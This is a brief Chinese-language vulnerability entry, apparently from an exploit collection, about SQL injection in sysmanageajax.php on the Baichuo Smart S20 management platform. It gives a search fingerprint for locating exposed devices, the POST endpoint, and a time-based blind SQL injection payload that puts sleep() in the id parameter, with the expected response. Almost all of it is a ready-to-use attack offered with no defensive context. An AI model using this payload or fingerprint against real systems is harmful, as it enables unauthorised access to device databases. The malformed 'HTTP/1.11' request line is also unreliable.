# 北京百绰智能S20管理平台sysmanageajax.phpsql注入漏洞

北京百绰智能S20管理平台sysmanageajax.php ｜ SQL注入 ｜ —
- **指纹**：`title="Smart管理平台"`
- **请求**：`POST /sysmanage/sysmanageajax.php HTTP/1.11`

**Payload**
```
src=manageadmin&type=add&id=(select*from(select+if(length(database())=3,sleep(5),1))a)11&value=test2123456
```
- **响应特征**：200